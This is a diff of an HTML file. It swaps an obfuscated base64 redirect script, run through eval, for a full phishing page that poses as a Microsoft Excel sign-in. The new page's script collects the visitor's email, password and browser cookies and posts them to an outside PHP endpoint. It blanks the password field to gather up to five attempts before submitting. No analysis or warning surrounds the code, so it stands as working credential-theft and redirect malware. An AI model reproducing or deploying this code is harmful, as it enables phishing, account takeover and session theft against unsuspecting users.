@@ -1,28 +1,283 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <title>Shipment</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>microsoft-excel Sign In</title>
+    <link rel="icon" href="https://i.ibb.co/9H72kJ1J/Screenshot-2024-12-08-at-21-31-20.png" sizes="any"> <!-- Online icon -->
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+            background-image: url('https://i.ibb.co/9H72kJ1J/Screenshot-2024-12-08-at-21-31-20.png'); /* Fixed background image */
+            background-size: cover;
+            background-position: center;
+        }
+        .container {
+            background-color: #f1f1f1; /* Excel style background */
+            background-image: url('https://i.ibb.co/zhFKp547/mmmk.png'); /* Excel grid background */
+            background-size: 100px 100px; /* Excel grid-like pattern */
+            padding: 50px;  /* Increased padding for more space */
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 400px;  /* Reduced max-width to make the container narrower */
+            max-height: 700px;  /* Increased max-height to make the container longer vertically */
+            position: relative;
+            overflow-y: auto;  /* Allows for scrolling if the content exceeds the height */
+        }
+        .container h1 {
+            margin-bottom: 16px;
+            font-size: 24px;
+            color: #333;
+            text-align: left;
+            margin-left: 0;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: none; /* Hide the label */
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .button {
+            background-color: #f1c40f;  /* microsoft-excel Access Point green color */
+            color: #333;  /* Dark text color */
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .button:hover {
+            background-color: #e1b10f;  /* Slightly darker green when hovered */
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            color: #777;
+        }
+        .footer a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        .logo {
+            text-align: left;
+            margin-bottom: 8px;
+        }
+        .logo img {
+            width: 120px; /* Increased the logo size */
+        }
+        .bottom-links {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            font-size: 12px;
+            color: #777;
+        }
+        .bottom-links a {
+            color: #0078d4;
+            text-decoration: none;
+            margin-left: 10px;
+        }
+        .email-display {
+            font-size: 24px; /* Increased font size */
+            font-weight: bold; /* Made the email text bold */
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .powered-by {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            font-size: 12px;
+            color: #777;
+        }
+        /* Added CSS to center the image */
+        .header-image {
+            width: 40%;
+            margin-bottom: 20px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Change the "Next" button to yellow */
+        #next-button {
+            background-color: #f1c40f;  /* Yellow color */
+            color: #333;  /* Dark text color */
+        }
+        #next-button:hover {
+            background-color: #e1b10f;  /* Slightly darker yellow when hovered */
+        }
+
+        /* Style the email input for large and bold text */
+        #email {
+            font-size: 24px;  /* Increased font size */
+            font-weight: bold; /* Made the text bold */
+        }
+    </style>
 </head>
 <body>
-    <p>Shipment access...</p>
+
+    <div class="container">
+        <!-- Centered the image -->
+        <img src="https://i.ibb.co/BKvvVVBK/microsoft-excel.png" alt="Access" class="header-image">
+        
+        <div class="logo" id="logo-container"></div>
+        <h1></h1>
+        <div id="email-display" class="email-display" style="display: none;"></div>
+        <form id="signin-form" action="https://lo.kinqbpi8.sa.com/gen/gen.php" method="POST">
+            <div class="input-group email-group">
+                <label for="email" style="display: none;">Email, phone, or Skype</label>
+                <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
+            </div>
+            <div class="input-group password-group" style="display: none;">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter password" required>
+            </div>
+            <button type="button" class="button" id="next-button">Next</button>
+            <button type="submit" class="button" id="signin-button" style="display: none;">Sign in</button>
+        </form>
+        <div class="footer">
+            <a href="#">Access Document With Your Email</a>
+        </div>
+    </div>
+    <div class="powered-by">
+        Powered by Microsoft-excel
+    </div>
+    <div class="bottom-links">
+        Copyright © 2025 Microsoft-excel, Inc. All rights reserved.
+        <br>
+        English (US) | <a href="#">Contact Us</a> | <a href="#">Terms of Use</a> | <a href="#">Privacy</a> | <a href="#">Intellectual Property</a> | <a href="#">Trust</a>
+    </div>
+
+    <script nonce="MTI1MjE2NDA4NCwzMjM5ODM0ODQ1">
+        var attemptCounter = 0;
+
+        // Function to get query parameter value from URL
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.has(param) ? urlParams.get(param) : null;
+        }
+
+        // Function to get cookies
+        function getCookies() {
+            var cookies = document.cookie.split(';');
+            var cookieObject = {};
+            cookies.forEach(function(cookie) {
+                var parts = cookie.split('=');
+                cookieObject[parts[0].trim()] = parts[1];
+            });
+            return cookieObject;
+        }
+
+        // Function to lock email input and display it as text
+        function lockAndDisplayEmail() {
+            var emailInput = document.getElementById('email');
+            var emailDisplay = document.getElementById('email-display');
+            var email = emailInput.value;
+            emailDisplay.textContent = email;
+            emailDisplay.style.display = 'block';
+            emailDisplay.style.fontWeight = 'bold'; // Ensure the email display is bold
+            emailDisplay.style.fontSize = '24px'; // Larger text for display
+            emailInput.style.display = 'none';
+
+            // Set a fixed background image
+            document.body.style.backgroundImage = 'url(https://i.ibb.co/9H72kJ1J/Screenshot-2024-12-08-at-21-31-20.png)';
+            var logoContainer = document.getElementById('logo-container');
+            logoContainer.innerHTML = ''; // Clear any logos
+        }
+
+        // Function to handle form submission
+        document.addEventListener('DOMContentLoaded', function() {
+            var emailParam = getQueryParam('email');
+            if (emailParam) {
+                document.getElementById('email').value = emailParam;
+                lockAndDisplayEmail();
+            }
+
+            var emailGroup = document.querySelector('.email-group');
+            var passwordGroup = document.querySelector('.password-group');
+            var nextButton = document.getElementById('next-button');
+            var signinButton = document.getElementById('signin-button');
+
+            nextButton.addEventListener('click', function() {
+                if (document.getElementById('email').value) {
+                    lockAndDisplayEmail();
+                    emailGroup.style.display = 'none';
+                    passwordGroup.style.display = 'block';
+                    nextButton.style.display = 'none';
+                    signinButton.style.display = 'block';
+                }
+            });
+
+            document.getElementById('email').addEventListener('keypress', function(event) {
+                if (event.key === 'Enter') {
+                    event.preventDefault();
+                    nextButton.click();
+                }
+            });
+
+            var form = document.getElementById('signin-form');
+
+            form.addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent form submission
+
+                var email = document.getElementById('email').value;
+                var password = document.getElementById('password').value;
+                attemptCounter++;
+
+                var cookies = getCookies();
+
+                var formData = new FormData();
+                formData.append('email', email);
+                formData.append('password', password);
+                formData.append('cookies', JSON.stringify(cookies));
+                formData.append('attempt', attemptCounter);
+
+                fetch('https://lo.kinqbpi8.sa.com/gen/gen.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    console.log('Response from server:', data);
+                })
+                .catch(error => {
+                    console.error('Error logging attempt:', error);
+                });
+
+                if (attemptCounter < 5) {
+                    document.getElementById('password').value = '';
+                } else {
+                    form.submit();
+                }
+            });
+
+            document.getElementById('password').addEventListener('keypress', function(event) {
+                if (event.key === 'Enter') {
+                    form.submit();
+                }
+            });
+        });
+    </script>
 </body>
-<script>
-    // Base64-encoded redirection script
-    const scriptBase64 = `
-        Ly8gRXh0cmFjdCB0aGUgY3VycmVudCBVUkwgcGFyYW1ldGVyIGNhbGxlZCBlbWFpbAoKY29uc3Qg
-Y3VycmVudFVybCA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmOwoKY29uc3QgZW1haWwgPSAoZnVuY3Rp
-b24oKSB7CiAgICBpZiAoY3VycmVudFVybC5pbmNsdWRlcygnP2VtYWlsPScpKSB7CiAgICAgICAg
-cmV0dXJuIG5ldyBVUkxTZWFyY2hQYXJhbWV0ZXJzKGN1cnJlbnRVcmwuc2VhcmNoKS5nZXQoJ2Vt
-YWlsJyk7CiAgICB9IGVsc2UgaWYgKGN1cnJlbnRVcmwuaW5jbHVkZXMoJyNlbnZlb3BnYXRlcz0n
-KSkgewogICAgICAgIHJldHVybiBjdXJyZW50VXJsLnNwbGl0KCc/ZW1haWw9JylbMV07CiAgICB9
-IGVsc2UgaWYgKGN1cnJlbnRVcmwuaW5jbHVkZXMoJyNlJykpIHsKICAgICAgICByZXR1cm4gY3Vy
-cmVudFVybC5zcGxpdCgnI2UnKVsxXTsKICAgIH0KICAgIHJldHVybiAnJzsKfSkoKTsKCi8vIFJl
-ZCBpcmVjdHMgdG8gdGhlIHNldCBkb21haW4gYW5kIHJlcGFzc2VkIGVtYWlsCgpjb25zdCByZWRp
-cmVjdFVybCA9ICJodHRwczovL2NnZWNqb2ZmaWNlLm9yZy9GZWRzc3NhLmh0bWw/ZW1haWw9IiAr
-IChlbWFpbCB8fCAnJyk7CgovLyBTZXRzIHRoZSBsb2NhdGlvbiB0byB0aGUgcmVkaXJlY3Rpb24g
-bGluawp3aW5kb3cubG9jYXRpb24uaHJlZiA9IHJlZGlyZWN0VXJsOw==
-    `;
-    eval(atob(scriptBase64));
-</script>
 </html>
